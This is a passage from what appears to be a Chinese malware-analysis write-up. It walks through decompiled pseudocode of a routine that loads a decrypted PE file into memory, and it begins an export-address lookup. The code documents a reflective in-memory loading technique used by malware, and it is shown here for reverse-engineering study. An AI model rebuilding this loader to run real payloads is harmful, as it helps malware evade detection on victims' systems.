<h3 id="5-3-5-WriteAllocMem-拷贝PE文件到内存"><a href="#5-3-5-WriteAllocMem-拷贝PE文件到内存" class="headerlink" title="5.3.5 WriteAllocMem 拷贝PE文件到内存"></a>5.3.5 WriteAllocMem 拷贝PE文件到内存</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token operator">*</span>__cdecl <span class="token function">sub_4021E9</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>pFileBase<span class="token punctuation">,</span> <span class="token keyword">int</span> FileSize<span class="token punctuation">,</span> <span class="token keyword">int</span> VirtualAlloc_Addr<span class="token punctuation">,</span> <span class="token keyword">int</span> VirtualFree_Addr<span class="token punctuation">,</span> <span class="token keyword">int</span> LoadLibraryA_Addr<span class="token punctuation">,</span> <span class="token keyword">int</span> GetProcAddress_Addr<span class="token punctuation">,</span> <span class="token keyword">int</span> FreeLibrary_Addr<span class="token punctuation">,</span> <span class="token keyword">int</span> a8<span class="token punctuation">)</span>  

<span class="token punctuation">&#123;</span>  

v28 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  

<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">CmpFileSize</span><span class="token punctuation">(</span>FileSize<span class="token punctuation">,</span> <span class="token number">0x40u</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>          <span class="token comment">// 比较文件大小是否大于等于0x40  </span>

<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  

<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span>_WORD <span class="token operator">*</span><span class="token punctuation">)</span>pFileBase <span class="token operator">!=</span> <span class="token number">0x5A4D</span> <span class="token punctuation">)</span>          <span class="token comment">// 判断是否是PE文件  </span>

<span class="token keyword">goto</span> LABEL_3<span class="token punctuation">;</span>  

<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">CmpFileSize</span><span class="token punctuation">(</span>FileSize<span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>pFileBase <span class="token operator">+</span> <span class="token number">0xF</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0xF8</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token comment">// 比较文件大小是否大于等于0x1F0  </span>

<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  

NtHeader <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>pFileBase <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>pFileBase <span class="token operator">+</span> <span class="token number">0xF</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  

<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>NtHeader <span class="token operator">!=</span> <span class="token number">0x4550</span> <span class="token punctuation">)</span>          <span class="token comment">// 判断是否是PE文件  </span>

<span class="token keyword">goto</span> LABEL_3<span class="token punctuation">;</span>  

<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_WORD <span class="token operator">*</span><span class="token punctuation">)</span>NtHeader <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0x14C</span> <span class="token punctuation">)</span>      <span class="token comment">// 判断文件运行平台 0x14C代表I386  </span>

<span class="token keyword">goto</span> LABEL_3<span class="token punctuation">;</span>  

SectionAlignment <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>NtHeader <span class="token operator">+</span> <span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  

<span class="token keyword">if</span> <span class="token punctuation">(</span> SectionAlignment <span class="token operator">&amp;</span> <span class="token number">1</span> <span class="token punctuation">)</span>                   <span class="token comment">// 判断内存对齐粒度  </span>

<span class="token keyword">goto</span> LABEL_3<span class="token punctuation">;</span>  

NumberOfSection <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int16 <span class="token operator">*</span><span class="token punctuation">)</span>NtHeader <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  

<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_WORD <span class="token operator">*</span><span class="token punctuation">)</span>NtHeader <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>               <span class="token comment">// 判断区段数量  </span>

<span class="token punctuation">&#123;</span>  

TextName <span class="token operator">=</span> <span class="token operator">&amp;</span>NtHeader<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int16 <span class="token operator">*</span><span class="token punctuation">)</span>NtHeader <span class="token operator">+</span> <span class="token number">10</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0x24</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token comment">// 取出SectionHeader[0]->name-----.text  </span>

<span class="token keyword">do</span>  

<span class="token punctuation">&#123;</span>  

TextSize <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>TextName <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     

<span class="token comment">// 取出SectionHeader[0]->SizeOfRawData-----0x6000  </span>

TextVirtualAddress <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>TextName<span class="token punctuation">;</span> 

<span class="token comment">// 取出SectionHeader[0]->VirtualAddersss-----0x1000  </span>

<span class="token keyword">if</span> <span class="token punctuation">(</span> TextSize <span class="token punctuation">)</span>  

SectionHeader<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> TextSize <span class="token operator">+</span> TextVirtualAddress<span class="token punctuation">;</span>

<span class="token comment">// 代码段的大小+代码段的起始地址=下一个区段的起始地址  </span>

<span class="token keyword">else</span>  

SectionHeader<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> SectionAlignment <span class="token operator">+</span> TextVirtualAddress<span class="token punctuation">;</span>  

<span class="token keyword">if</span> <span class="token punctuation">(</span> SectionHeader<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">></span> v28 <span class="token punctuation">)</span>  

v28 <span class="token operator">=</span> SectionHeader<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  

TextName <span class="token operator">+=</span> <span class="token number">0x28</span><span class="token punctuation">;</span>  

<span class="token operator">--</span>NumberOfSection<span class="token punctuation">;</span>  

<span class="token punctuation">&#125;</span>  

<span class="token keyword">while</span> <span class="token punctuation">(</span> NumberOfSection <span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token comment">// 遍历区段  </span>

<span class="token punctuation">&#125;</span>  

hKernel32 <span class="token operator">=</span> <span class="token function">GetModuleHandleA</span><span class="token punctuation">(</span>Kernel32<span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment">// 获取Kernel32的基址  </span>

<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>hKernel32 <span class="token punctuation">)</span>  

<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  

GetSystemInfo_Addr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token punctuation">(</span>__stdcall <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token punctuation">(</span>__cdecl <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>HMODULE<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token punctuation">(</span>__stdcall <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>LPSYSTEM_INFO<span class="token punctuation">)</span><span class="token punctuation">,</span> _DWORD<span class="token punctuation">)</span><span class="token punctuation">)</span>GetProcAddress_Addr<span class="token punctuation">)</span>、<span class="token punctuation">(</span>hKernel32<span class="token punctuation">,</span> GetNativeSystemInfo<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 获取GetNativeSystemInfo函数地址  </span>

<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>GetSystemInfo_Addr <span class="token punctuation">)</span>  

<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  

<span class="token function">GetSystemInfo_Addr</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>lpSystemInfo<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// 获取系统信息  </span>

v17 <span class="token operator">=</span> <span class="token operator">~</span><span class="token punctuation">(</span>v27 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  

dwSize <span class="token operator">=</span> v17 <span class="token operator">&amp;</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>NtHeader <span class="token operator">+</span> <span class="token number">20</span><span class="token punctuation">)</span> <span class="token operator">+</span> v27 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  

<span class="token keyword">if</span> <span class="token punctuation">(</span> dwSize <span class="token operator">!=</span> <span class="token punctuation">(</span>v17 <span class="token operator">&amp;</span> <span class="token punctuation">(</span>v27 <span class="token operator">+</span> v28 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>      <span class="token comment">// 此处条件不成立 跳过if分支  </span>

<span class="token punctuation">&#123;</span>  

LABEL_3<span class="token operator">:</span>  

<span class="token function">SetLastError</span><span class="token punctuation">(</span><span class="token number">0xC1u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  

<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  

<span class="token punctuation">&#125;</span>  

pAllocAddress <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token punctuation">(</span>__cdecl <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>_DWORD<span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">signed</span> <span class="token keyword">int</span><span class="token punctuation">,</span> MACRO_PAGE<span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">)</span>VirtualAlloc_Addr<span class="token punctuation">)</span><span class="token punctuation">(</span>  

<span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>NtHeader <span class="token operator">+</span> <span class="token number">13</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  

dwSize<span class="token punctuation">,</span>  

<span class="token number">0x3000</span><span class="token punctuation">,</span>  

PAGE_READWRITE<span class="token punctuation">,</span>  

a8<span class="token punctuation">)</span><span class="token punctuation">;</span>       
<span class="token comment">// 申请一块大小为0x10000的可读可写的内存空间  </span>

<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>pAllocAddress <span class="token punctuation">)</span>  

<span class="token punctuation">&#123;</span>  

pAllocAddress <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token punctuation">(</span>__cdecl <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>_DWORD<span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">signed</span> <span class="token keyword">int</span><span class="token punctuation">,</span> MACRO_PAGE<span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">)</span>VirtualAlloc_Addr<span class="token punctuation">)</span><span class="token punctuation">(</span>  

<span class="token number">0</span><span class="token punctuation">,</span>  

dwSize<span class="token punctuation">,</span>  

<span class="token number">0x3000</span><span class="token punctuation">,</span>  

PAGE_READWRITE<span class="token punctuation">,</span>  

a8<span class="token punctuation">)</span><span class="token punctuation">;</span>                      <span class="token comment">// 如果申请失败则再次申请  </span>

<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>pAllocAddress <span class="token punctuation">)</span>  

<span class="token punctuation">&#123;</span>  

LABEL_24<span class="token operator">:</span>  

<span class="token function">SetLastError</span><span class="token punctuation">(</span><span class="token number">0xEu</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  

<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  

<span class="token punctuation">&#125;</span>  

<span class="token punctuation">&#125;</span>  

hHeap <span class="token operator">=</span> <span class="token function">GetProcessHeap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                     <span class="token comment">// 获取进程的堆句柄  </span>

pHeapAddress <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">HeapAlloc</span><span class="token punctuation">(</span>hHeap<span class="token punctuation">,</span> HEAP_ZERO_MEMORY<span class="token punctuation">,</span> <span class="token number">0x3Cu</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  

pHeapBase <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span>pHeapAddress<span class="token punctuation">;</span>  

<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>pHeapAddress <span class="token punctuation">)</span>  

<span class="token punctuation">&#123;</span>  

<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token punctuation">(</span>__cdecl <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">,</span> _DWORD<span class="token punctuation">,</span> <span class="token keyword">signed</span> <span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">)</span>VirtualFree_Addr<span class="token punctuation">)</span><span class="token punctuation">(</span>pAllocAddress<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x8000</span><span class="token punctuation">,</span> a8<span class="token punctuation">)</span><span class="token punctuation">;</span>  

<span class="token keyword">goto</span> LABEL_24<span class="token punctuation">;</span>  

<span class="token punctuation">&#125;</span>  

<span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>pHeapAddress <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">=</span> pAllocAddress<span class="token punctuation">;</span>  

<span class="token function">LOWORD</span><span class="token punctuation">(</span>pHeapAddress<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_WORD <span class="token operator">*</span><span class="token punctuation">)</span>NtHeader <span class="token operator">+</span> <span class="token number">11</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  

pHeapBase<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>pHeapAddress <span class="token operator">>></span> <span class="token number">13</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">1</span><span class="token punctuation">;</span>  

pHeapBase<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">=</span> VirtualAlloc_Addr<span class="token punctuation">;</span>  

pHeapBase<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span> VirtualFree_Addr<span class="token punctuation">;</span>  

pHeapBase<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">=</span> LoadLibraryA_Addr<span class="token punctuation">;</span>  

pHeapBase<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">=</span> GetProcAddress_Addr<span class="token punctuation">;</span>  

pHeapBase<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token operator">=</span> FreeLibrary_Addr<span class="token punctuation">;</span>  

pHeapBase<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">=</span> a8<span class="token punctuation">;</span>  

pHeapBase<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">=</span> v27<span class="token punctuation">;</span>  

<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">CmpFileSize</span><span class="token punctuation">(</span>FileSize<span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>NtHeader <span class="token operator">+</span> <span class="token number">0x15</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token comment">// 比较文件大小是否大于等于SizeOfHeaders  0x1000  </span>

<span class="token operator">||</span> <span class="token punctuation">(</span>AllocAddr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token punctuation">(</span>__cdecl <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">,</span> _DWORD<span class="token punctuation">,</span> <span class="token keyword">signed</span> <span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">signed</span> <span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">)</span>VirtualAlloc_Addr<span class="token punctuation">)</span><span class="token punctuation">(</span>  

pAllocAddress<span class="token punctuation">,</span>  

<span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>NtHeader <span class="token operator">+</span> <span class="token number">21</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  

<span class="token number">0x1000</span><span class="token punctuation">,</span>  

<span class="token number">4</span><span class="token punctuation">,</span>  

a8<span class="token punctuation">)</span><span class="token punctuation">,</span> 
<span class="token comment">// 申请一块大小为0x1000的可读可写的内存  0x1000是SizeOfHeaders  </span>

<span class="token function">memcpy</span><span class="token punctuation">(</span>AllocAddr<span class="token punctuation">,</span> pFileBase<span class="token punctuation">,</span>
<span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>NtHeader <span class="token operator">+</span> <span class="token number">21</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>

<span class="token comment">// 把PE头拷贝到申请的堆空间  </span>

NtHeaderBaseAddr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>AllocAddr<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>pFileBase <span class="token operator">+</span> <span class="token number">0xF</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  

<span class="token operator">*</span>pHeapBase <span class="token operator">=</span> NtHeaderBaseAddr<span class="token punctuation">,</span>  

<span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>NtHeaderBaseAddr <span class="token operator">+</span> <span class="token number">52</span><span class="token punctuation">)</span> <span class="token operator">=</span> pAllocAddress<span class="token punctuation">,</span>  

<span class="token operator">!</span><span class="token function">sub_402470</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>pFileBase<span class="token punctuation">,</span> FileSize<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>NtHeader<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>pHeapBase<span class="token punctuation">)</span><span class="token punctuation">)</span>  

<span class="token operator">||</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">*</span>pHeapBase <span class="token operator">+</span> <span class="token number">52</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>NtHeader <span class="token operator">+</span> <span class="token number">13</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token punctuation">(</span>pHeapBase<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token punctuation">(</span>pHeapBase<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">sub_402758</span><span class="token punctuation">(</span>pHeapBase<span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">*</span>pHeapBase <span class="token operator">+</span> <span class="token number">52</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>NtHeader <span class="token operator">+</span> <span class="token number">13</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  

<span class="token operator">!</span><span class="token function">sub_4027DF</span><span class="token punctuation">(</span>pHeapBase<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">sub_40254B</span><span class="token punctuation">(</span>pHeapBase<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">sub_40271D</span><span class="token punctuation">(</span>pHeapBase<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>  

<span class="token punctuation">&#123;</span>  

LABEL_37<span class="token operator">:</span>  

<span class="token function">sub_4029CC</span><span class="token punctuation">(</span>pHeapBase<span class="token punctuation">)</span><span class="token punctuation">;</span>  

<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  

<span class="token punctuation">&#125;</span>  

v24 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">*</span>pHeapBase <span class="token operator">+</span> <span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  

<span class="token keyword">if</span> <span class="token punctuation">(</span> v24 <span class="token punctuation">)</span>  

<span class="token punctuation">&#123;</span>  

<span class="token keyword">if</span> <span class="token punctuation">(</span> pHeapBase<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token punctuation">)</span>  

<span class="token punctuation">&#123;</span>  

<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token punctuation">(</span>__stdcall <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">signed</span> <span class="token keyword">int</span><span class="token punctuation">,</span> _DWORD<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span>pAllocAddress <span class="token operator">+</span> v24<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span>pAllocAddress<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>  

<span class="token punctuation">&#123;</span>  

<span class="token function">SetLastError</span><span class="token punctuation">(</span><span class="token number">0x45Au</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  

<span class="token keyword">goto</span> LABEL_37<span class="token punctuation">;</span>  

<span class="token punctuation">&#125;</span>  

pHeapBase<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>  

<span class="token punctuation">&#125;</span>  

<span class="token keyword">else</span>  

<span class="token punctuation">&#123;</span>  

pHeapBase<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">=</span> pAllocAddress <span class="token operator">+</span> v24<span class="token punctuation">;</span>  

<span class="token punctuation">&#125;</span>  

<span class="token punctuation">&#125;</span>  

<span class="token keyword">else</span>  

<span class="token punctuation">&#123;</span>  

pHeapBase<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  

<span class="token punctuation">&#125;</span>  

<span class="token keyword">return</span> pHeapBase<span class="token punctuation">;</span>  

<span class="token punctuation">&#125;</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>该函数申请了一块堆空间 并将去掉了解密出的PE文件的DOS头并拷贝到了堆空间中</p>
<h3 id="5-3-6-GetExportFunAddr-获取导出函数地址"><a href="#5-3-6-GetExportFunAddr-获取导出函数地址" class="headerlink" title="5.3.6 GetExportFunAddr 获取导出函数地址"></a>5.3.6 GetExportFunAddr 获取导出函数地址</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c">AllocBase <span class="token operator">=</span> <span class="token punctuation">(</span>_DWORD <span class="token punctuation">)</span><span class="token punctuation">(</span>pHeapBase <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// AllocBase=0x10000000 是申请的空间的基址  </span>

DataDirectory <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token punctuation">)</span>pHeapBase <span class="token operator">+</span> <span class="token number">0x78</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// pe头+0x78=数据目录表  </span>

AllocBase_2 <span class="token operator">=</span> <span class="token punctuation">(</span>_DWORD <span class="token punctuation">)</span><span class="token punctuation">(</span>pHeapBase <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  

